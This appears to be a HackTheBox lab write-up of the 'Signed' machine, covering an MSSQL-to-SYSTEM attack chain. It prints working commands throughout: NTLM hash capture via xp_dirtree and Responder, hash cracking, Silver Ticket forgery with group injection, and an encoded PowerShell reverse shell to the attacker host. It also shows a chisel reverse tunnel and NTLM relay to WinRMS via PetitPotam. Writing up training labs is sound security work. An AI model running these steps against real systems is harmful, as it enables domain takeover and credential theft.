---
title: signed
published: 2025-10-17
description: ''
image: ''
tags: []
category: ''
draft: false 
lang: ''
---
# Description

A concise walkthrough of enumerating and attacking an MS SQL Server on a HackTheBox machine. I enumerate open services, authenticate to MSSQL, capture an NTLM hash via `xp_dirtree` and Responder, crack it, build a Silver Ticket to impersonate privileged users, escalate to a shell via `xp_cmdshell`, pivot to access AD services, and finally achieve SYSTEM via NTLM reflection / relay to WinRM.

#HTB #mssql #ntlm-reflection

# Enumeration

We start as usual with an Nmap scan:

```bash
sudo nmap -sC -sV -oA Signed 10.10.11.90

Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-16 16:55 UTC
Nmap scan report for DC01.SIGNED.HTB (10.10.11.90)
Host is up (0.044s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server  16.00.1000.00
| ms-sql-ntlm-info: 
|   Target_Name: SIGNED
|   NetBIOS_Domain_Name: SIGNED
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SIGNED.HTB
|   DNS_Computer_Name: DC01.SIGNED.HTB
|   DNS_Tree_Name: SIGNED.HTB
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-15T19:10:34
|_Not valid after:  2055-10-15T19:10:34
|_ssl-date: 2025-10-16T16:56:51+00:00; +1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.10.11.90:1433: 
|     Version: 
|       name: Microsoft SQL Server 
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 
|_    TCP port: 1433

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.67 seconds
```

We notice the only open TCP port is 1433 (MS SQL). Let's try a UDP scan instead.

From the first Nmap scan we also see MS-SQL NTLM info:

```
| ms-sql-ntlm-info: 
|   Target_Name: SIGNED
|   NetBIOS_Domain_Name: SIGNED
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SIGNED.HTB
|   DNS_Computer_Name: DC01.SIGNED.HTB
|   DNS_Tree_Name: SIGNED.HTB
```

This strongly suggests the machine is domain-joined. We can’t see AD services from our network because they are either only accessible locally or a firewall is blocking those ports.

## MSSQL enumeration

First, let's connect to the MSSQL service with the given credentials:

```bash
mssqlclient.py 'DC01.SIGNED.HTB/scott:Sm230#C5NatH'@10.10.11.90
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (scott  guest@master)> 
```

Let's see if we can execute commands with `xp_cmdshell`:

```bash
enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

As expected, we can't — we only have a guest session.

Other enumeration attempts (impersonation, DB links, etc.) did not yield results.

### Capturing an NTLM hash via `xp_dirtree`

We try `xp_dirtree` to force an SMB authentication and capture an NTLMv2 hash. First, run Responder on our attack box:

```bash
python3 ./Responder.py -I tun0

....
[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...
```

Then call an SMB path from SQL Server:

```sql
SQL (scott  guest@master)> EXEC xp_dirtree '\\10.10.14.27\share\x'
subdirectory   depth   
------------   -----   
SQL (scott  guest@master)>
```

Responder receives the authentication attempt:

```text
[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:71e1e7fa922bb56e:3A633D6B1298A52CEB09D45794BC5049:01010000000000008086E663BF3EDC01680DF61BAF4711A6000000000200080045004E004800500001001E00570049004E002D0037005800310044004E0055004B00430059004300410004003400570049004E002D0037005800310044004E0055004B0043005900430041002E0045004E00480050002E004C004F00430041004C000300140045004E00480050002E004C004F00430041004C000500140045004E00480050002E004C004F00430041004C00070008008086E663BF3EDC0106000400020000000800300030000000000000000000000000300000AEA6022709B5070BE6FCA7536F7F7FB9FD29065EA790A8677F37C9296A08077E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320037000000000000000000
```

Now we crack the NTLM hash with Hashcat:

```bash
hashcat -m 5600 mssqlsvc_ntlm rockyou.txt

MSSQLSVC::SIGNED:71e1e7fa922bb56e:3a633d6b1298a52ceb09d45794bc5049:01010000000000008086e663bf3edc01680df61baf4711a6000000000200080045004e004800500001001e00570049004e002d0037005800310044004e0055004b00430059004300410004003400570049004e002d0037005800310044004e0055004b0043005900430041002e0045004e00480050002e004c004f00430041004c000300140045004e00480050002e004c004f00430041004c000500140045004e00480050002e004c004f00430041004c00070008008086e663bf3edc0106000400020000000800300030000000000000000000000000300000aea6022709b5070be6fca7536f7f7fb9fd29065ea790a8677f37c9296a08077e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320037000000000000000000:purPLE9795!@
```

We now have the `MSSQLSVC` password (`purPLE9795!@`), which is a service account. We can attempt a Silver Ticket attack to impersonate privileged users for the MSSQL service. For that we need the domain SID and the MD4 hash of the `MSSQLSVC` password.

#### Domain SID via MSSQL

Because AD ports were not directly reachable, we obtain the domain SID using SQL:

```bash
$ mssqlclient.py SIGNED.HTB/mssqlsvc:'purPLE9795!@'@10.10.11.90 -windows-auth
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  SIGNED\mssqlsvc@master)> 
```

Get the hex SID for the `mssqlsvc` account:

```sql
SQL (SIGNED\mssqlsvc  SIGNED\mssqlsvc@master)> SELECT master.dbo.fn_varbintohexstr(SUSER_SID('SIGNED\mssqlsvc')) AS sid_hex;
sid_hex                                                      
----------------------------------------------------------   
0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
```

Convert the binary SID to a readable SID string. Example Python script:

```python
import sys
import base64
import re
from typing import Union

def bytes_to_sid(b: bytes) -> str:
    if len(b) < 8:
        raise ValueError("SID blob too short")
    revision = b[0]
    sub_count = b[1]
    ident_auth = int.from_bytes(b[2:8], byteorder='big')
    # parse subauthorities
    subs = []
    expected_len = 8 + (4 * sub_count)
    if len(b) < expected_len:
        raise ValueError(f"SID blob length {len(b)} < expected {expected_len}")
    for i in range(sub_count):
        start = 8 + i*4
        sub = int.from_bytes(b[start:start+4], byteorder='little')
        subs.append(str(sub))
    # Build string
    sid_str = "S-{}-{}".format(revision, ident_auth)
    if subs:
        sid_str += "-" + "-".join(subs)
    return sid_str

print(bytes_to_sid(bytes.fromhex("0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000")))
```

This yields:  
`S-1-5-21-4088429403-1159899800-2753317549-1103`  
So the domain SID is `S-1-5-21-4088429403-1159899800-2753317549`.

#### MD4 of MSSQLSVC's password

Compute the MD4 (NT hash) of the password:

```bash
$ echo -n 'purPLE9795!@' | iconv -t UTF-16LE | openssl dgst -provider legacy -md4 -binary | xxd -p

ef699384c3285c54128a3ee1ddb1a0cc
```

## Silver Ticket (user impersonation)

We will create a TGS for the `Administrator` user (likely to have admin rights on MSSQL) using the `MSSQLSVC` NT hash:

```bash
$ ticketer.py -nthash EF699384C3285C54128A3EE1DDB1A0CC -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB:1433 administrator

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in administrator.ccache
```

Save the ticket to the Kerberos cache:

```bash
export KRB5CCNAME=lol.ccache
```

Now connect with `mssqlclient` using the ticket:

```bash
$ mssqlclient.py -k DC01.SIGNED.HTB
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  guest@master)> 
```

We are still a `guest`, so the `Administrator` account may not have `sysadmin` on MSSQL.

Let's enumerate domain users and groups we can see via MSSQL and check for interesting groups:

```bash
$ netexec mssql SIGNED.HTB -u mssqlsvc -p 'purPLE9795!@' --rid-brute

MSSQL                    10.129.47.129   1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL                    10.129.47.129   1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
MSSQL                    10.129.47.129   1433   DC01             498: SIGNED\Enterprise Read-only Domain Controllers
MSSQL                    10.129.47.129   1433   DC01             500: SIGNED\Administrator
MSSQL                    10.129.47.129   1433   DC01             501: SIGNED\Guest
MSSQL                    10.129.47.129   1433   DC01             502: SIGNED\krbtgt
MSSQL                    10.129.47.129   1433   DC01             512: SIGNED\Domain Admins
MSSQL                    10.129.47.129   1433   DC01             513: SIGNED\Domain Users
MSSQL                    10.129.47.129   1433   DC01             514: SIGNED\Domain Guests
MSSQL                    10.129.47.129   1433   DC01             515: SIGNED\Domain Computers
MSSQL                    10.129.47.129   1433   DC01             516: SIGNED\Domain Controllers
MSSQL                    10.129.47.129   1433   DC01             517: SIGNED\Cert Publishers
MSSQL                    10.129.47.129   1433   DC01             518: SIGNED\Schema Admins
MSSQL                    10.129.47.129   1433   DC01             519: SIGNED\Enterprise Admins
MSSQL                    10.129.47.129   1433   DC01             520: SIGNED\Group Policy Creator Owners
MSSQL                    10.129.47.129   1433   DC01             521: SIGNED\Read-only Domain Controllers
MSSQL                    10.129.47.129   1433   DC01             522: SIGNED\Cloneable Domain Controllers
MSSQL                    10.129.47.129   1433   DC01             525: SIGNED\Protected Users
MSSQL                    10.129.47.129   1433   DC01             526: SIGNED\Key Admins
MSSQL                    10.129.47.129   1433   DC01             527: SIGNED\Enterprise Key Admins
MSSQL                    10.129.47.129   1433   DC01             553: SIGNED\RAS and IAS Servers
MSSQL                    10.129.47.129   1433   DC01             571: SIGNED\Allowed RODC Password Replication Group
MSSQL                    10.129.47.129   1433   DC01             572: SIGNED\Denied RODC Password Replication Group
MSSQL                    10.129.47.129   1433   DC01             1000: SIGNED\DC01$
MSSQL                    10.129.47.129   1433   DC01             1101: SIGNED\DnsAdmins
MSSQL                    10.129.47.129   1433   DC01             1102: SIGNED\DnsUpdateProxy
MSSQL                    10.129.47.129   1433   DC01             1103: SIGNED\mssqlsvc
MSSQL                    10.129.47.129   1433   DC01             1104: SIGNED\HR
MSSQL                    10.129.47.129   1433   DC01             1105: SIGNED\IT
MSSQL                    10.129.47.129   1433   DC01             1106: SIGNED\Finance
MSSQL                    10.129.47.129   1433   DC01             1107: SIGNED\Developers
MSSQL                    10.129.47.129   1433   DC01             1108: SIGNED\Support
MSSQL                    10.129.47.129   1433   DC01             1109: SIGNED\oliver.mills
```

We notice a group named `IT`, which likely has `sysadmin` rights on MSSQL. We'll create tickets that include that group to impersonate a user who is a member of it.

To include group membership in the ticket we add the `-groups` flag to `ticketer`:

```bash
ticketer.py -nthash EF699384C3285C54128A3EE1DDB1A0CC -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB:1433 -groups 1105 administrator
```

Now connect with `mssqlclient` using the Kerberos ticket:

```bash
$ mssqlclient.py -k DC01.SIGNED.HTB
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  dbo@master)> 
```

Now we are `dbo` with `sysadmin` rights on MSSQL, so we can execute commands and get a shell.

```sql
SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell 
SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell powershell -e JABEAHUAZABlACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAIgAxADAALgAxADAALgAxADQALgAyADcAIgAsADEAMwAzADcAKQA7ACQAcwB1AGIAcwBzAHMAcwAgAD0AIAAkAEQAdQBkAGUALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpAGkAagAgAD0AIAAkAHMAdQBiAHMAcwBzAHMALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABlAGYAaQBuAGkAdABsAHkAbgBvAHQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAaQBqACkAOwAkAHMAZgBvAHIAdwBhAHIAZAAgAD0AIAAoAGkAZQB4ACAAJABkAGUAZgBpAG4AaQB0AGwAeQBuAG8AdABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBmAG8AcgB3AGEAcgBkADIAIAAgAD0AIAAkAHMAZgBvAHIAdwBhAHIAZAAgACsAIAAiAD4AIAAiADsAJABkAG8AbgB0AHMAQgB0ACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGYAbwByAHcAYQByAGQAMgApADsAJABzAHUAYgBzAHMAcwBzAC4AVwByAGkAdABlACgAJABkAG8AbgB0AHMAQgB0ACwAMAAsACQAZABvAG4AdABzAEIAdAAuAEwAZQBuAGcAdABoACkAOwAkAHMAdQBiAHMAcwBzAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAEQAdQBkAGUALgBDAGwAbwBzAGUAKAApAAoA
```

Now open a listener on your attack machine:

```bash
rlwrap nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.10.11.90 57191
whoami
signed\mssqlsvc
> type c:\users\mssqlsvc\Desktop\user.txt
3f2e2******************a30cdf5
```

We have the user flag.

## Privilege escalation

With a shell on `DC01`, we perform reverse dynamic port forwarding using `chisel` to access AD services (LDAP, Kerberos, etc.) from our attack machine. This helps bypass firewall restrictions.

On the attacker machine:

```bash
$ ./chisel server --reverse -v -p 1234 --socks5

2025/10/16 17:55:02 server: Reverse tunnelling enabled
2025/10/16 17:55:02 server: Fingerprint lRZtBRpCBDYCZsmc96CRgntCPUxzRV2++kbPa3sud+4=
2025/10/16 17:55:02 server: Listening on http://0.0.0.0:1234
```

On the pivot host (DC01) connect back to the chisel server:

```bash
./chisel.exe client -v 10.10.14.27:1234 R:socks
```

Verify we can reach LDAP through the SOCKS proxy:

```bash
proxychains4 netexec ldap 10.10.11.90 -u mssqlsvc -p 'purPLE9795!@'
[proxychains] config file found: /usr/local/etc/proxychains.conf
[proxychains] preloading /usr/local/lib/libproxychains.so.4
[proxychains] DLL init
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.90:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.90:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.90:636  ...  OK
LDAP        10.10.11.90     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB) (signing:None) (channel binding:No TLS cert)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.90:389  ...  OK
LDAP        10.10.11.90     389    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
```

## NTLM reflection / relay to SYSTEM

We check if NTLM reflection/relay is possible:

```bash
$ proxychains4 netexec smb 10.10.11.90 -u mssqlsvc -p 'purPLE9795!@' -M ntlm_reflection

SMB         10.10.11.90     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.90:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.90:445  ...  OK
SMB         10.10.11.90     445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
NTLM_REF... 10.10.11.90     445    DC01             VULNERABLE (can relay SMB to other protocols except SMB on 10.10.11.90)
```

It is vulnerable to NTLM reflection. The Synacktiv blog is a good deep dive on this class of attacks: [https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)

We create a DNS record that points to our machine (so the DC will resolve and authenticate to our relay target):

```bash
proxychains4 python3 ./dnstool.py -u 'SIGNED.HTB\mssqlsvc' -p 'purPLE9795!@' 10.10.11.90 -a add -r localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.14.27
```

Start `ntlmrelayx` and relay to WinRMS (we choose WinRMS because we can't relay to LDAP due to signing; SMB signing prevents some relays):

```bash
proxychains4 ntlmrelayx.py -t winrms://DC01.SIGNED.HTB -smb2support

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client WINRMS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

Force the target to authenticate to our relay using PetitPotam:

```bash
$ proxychains4 python3 PetitPotam.py -u mssqlsvc -p 'purPLE9795!@' -d SIGNED.HTB localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA DC01.SIGNED.HTB

Trying pipe lsarpc
[-] Connecting to ncacn_np:DC01.SIGNED.HTB[\PIPE\lsarpc]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.90:445  ...  OK
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

In the `ntlmrelayx` console, a WinRMS session is created and mapped to a local TCP port (e.g., `127.0.0.1:11001`):

```
...
[*] (SMB): Authenticating connection from /@10.10.11.90 against winrms://DC01.SIGNED.HTB SUCCEED [2]
[*] winrms:///@dc01.signed.htb [2] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11001
...
```

Connect to that local port to get an interactive WinRMS shell:

```bash
rlwrap nc 127.0.0.1 11001
Type help for list of commands

whoami
nt authority\system

type c:\users\Administrator\Desktop\root.txt
193b********************fa95c6ff5
```

We have SYSTEM and the root flag.